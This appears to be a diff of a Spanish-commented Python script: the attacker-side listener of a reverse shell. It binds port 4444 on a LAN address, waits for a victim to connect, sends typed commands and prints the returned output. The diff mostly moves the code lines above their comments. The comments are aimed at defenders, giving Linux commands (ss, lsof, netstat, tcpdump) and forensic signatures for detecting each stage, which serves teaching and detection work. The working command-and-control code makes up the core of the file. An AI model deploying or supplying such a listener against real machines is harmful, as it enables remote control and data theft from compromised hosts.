@@ -18,125 +18,116 @@ import socket
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CREACIÓN DEL SOCKET                                                     │
 # └─────────────────────────────────────────────────────────────────────────┘
-
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # socket.socket() → Crea un endpoint de comunicación de red
     # AF_INET         → Familia de direcciones IPv4 (ej: 192.168.1.39)
     # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)
 
     # 🛡️ DETECCIÓN: Esta combinación (TCP + IPv4) es común en malware C2
     # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CONFIGURACIÓN DE OPCIONES DEL SOCKET                                    │
 # └─────────────────────────────────────────────────────────────────────────┘
-
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # setsockopt()       → Configura opciones avanzadas del socket
     # SOL_SOCKET         → Nivel de configuración (opciones generales)
     # SO_REUSEADDR       → Permite reutilizar el puerto inmediatamente
     # 1                  → Valor booleano (True) para activar
 
     # 🛡️ DETECCIÓN: Esta opción es común en servidores legítimos y malware
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ ENLACE DEL PUERTO (BIND) - PUNTO DE DETECCIÓN #1 ⚠️                     │
 # └─────────────────────────────────────────────────────────────────────────┘
-
+listener.bind(("192.168.1.39", 4444))
     # bind()            → Asocia el socket a una IP y puerto específicos
     # 192.168.1.39      → IP de la interfaz de red donde escuchar
     # 4444              → Número de puerto para conexiones entrantes
 
     # 🛡️ DETECCIÓN #1: Puerto 4444 en estado LISTEN
     # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep 4444
-listener.bind(("192.168.1.39", 4444))
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ INICIAR ESCUCHA (LISTEN)                                                │
 # └─────────────────────────────────────────────────────────────────────────┘
+listener.listen(0)
 
     # listen()    → Habilita el socket para aceptar conexiones entrantes
     # 0           → Número máximo de conexiones en cola (BACKLOG)
 
     # 🛡️ DETECCIÓN: Socket cambia de estado a LISTEN
     # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep python
-listener.listen(0)
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ MENSAJE DE ESTADO - HUELLA FORENSE #1                                   │
 # └─────────────────────────────────────────────────────────────────────────┘
+print("[+] Esperando Conexiones")
 
     # print() → Muestra mensaje en la consola/terminal del atacante
 
     # 🛡️ DETECCIÓN: Evidencia forense si se captura la terminal
-print("[+] Esperando Conexiones")
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ ACEPTAR CONEXIÓN - PUNTO DE DETECCIÓN #2 ⚠️                             │
 # └─────────────────────────────────────────────────────────────────────────┘
-
+connection, address = listener.accept()
     # accept()  → Bloquea hasta que una víctima se conecta
     # connection → Nuevo socket para comunicación con la víctima
     # address    → Tupla con (IP, Puerto) de la víctima
 
     # 🛡️ DETECCIÓN #2: Conexión ESTABLISHED desde víctima hacia 4444
     # 🛡️ COMANDO MANJARO: sudo netstat -antp | grep 4444
-connection, address = listener.accept()
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ CONFIRMACIÓN DE CONEXIÓN - HUELLA FORENSE #2                            │
 # └─────────────────────────────────────────────────────────────────────────┘
+print("[+] Tenemos una conexion de " + str(address))
 
     # print() → Muestra información de la víctima comprometida
 
     # 🛡️ DETECCIÓN: La IP de la víctima queda registrada en consola
-print("[+] Tenemos una conexion de " + str(address))
 
 # ┌─────────────────────────────────────────────────────────────────────────┐
 # │ BUCLE PRINCIPAL - CONTROL REMOTO ACTIVO                                 │
 # └─────────────────────────────────────────────────────────────────────────┘
-
-    # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
-while True:
+while True: # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos)
     
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ ENTRADA DE COMANDOS - HUELLA FORENSE #3                             │
     # └─────────────────────────────────────────────────────────────────────┘
-    
+    command = input("shell»»")
         # input()     → El atacante escribe comandos manualmente
         # shell»»     → Prompt personalizado (firma detectable)
         #
         # 🛡️ DETECCIÓN: Prompt "shell»»" es firma única en logs de terminal
-    command = input("shell»»")
-    
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ ENVÍO DE COMANDO A LA VÍCTIMA - PUNTO DE DETECCIÓN #3 ⚠️            │
     # └─────────────────────────────────────────────────────────────────────┘
+    connection.send(command.encode('utf-8'))
     
         # send()          → Envía datos a través del túnel TCP
         # encode('utf-8') → Convierte STRING a BYTES (requerido en Python 3)
         
         # 🛡️ DETECCIÓN #3: Comandos en TEXTO PLANO visibles en red
         # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
-    connection.send(command.encode('utf-8'))
     
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ RECEPCIÓN DE RESULTADOS - EXFILTRACIÓN DE DATOS ⚠️                  │
     # └─────────────────────────────────────────────────────────────────────┘
-    
+    result = connection.recv(1024)
+        
         # recv(1024) → Recibe hasta 1024 bytes de datos de la víctima
         
         # 🛡️ DETECCIÓN #4: Datos salientes desde víctima en puerto 4444
         # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w c2.pcap
-    result = connection.recv(1024)
-    
+
     # ┌─────────────────────────────────────────────────────────────────────┐
     # │ MOSTRAR RESULTADOS - HUELLA FORENSE #4                              │
     # └─────────────────────────────────────────────────────────────────────┘
-    
-        # print()           → Muestra resultados en consola del atacante
+    print(result.decode('utf-8', errors='ignore'))
+            # print()           → Muestra resultados en consola del atacante
         # decode('utf-8')   → Convierte BYTES a STRING legible
         # errors='ignore'   → Ignora caracteres inválidos (evita crashes)
         
         # 🛡️ DETECCIÓN: Evidencia forense de qué información fue comprometida
-    print(result.decode('utf-8', errors='ignore'))
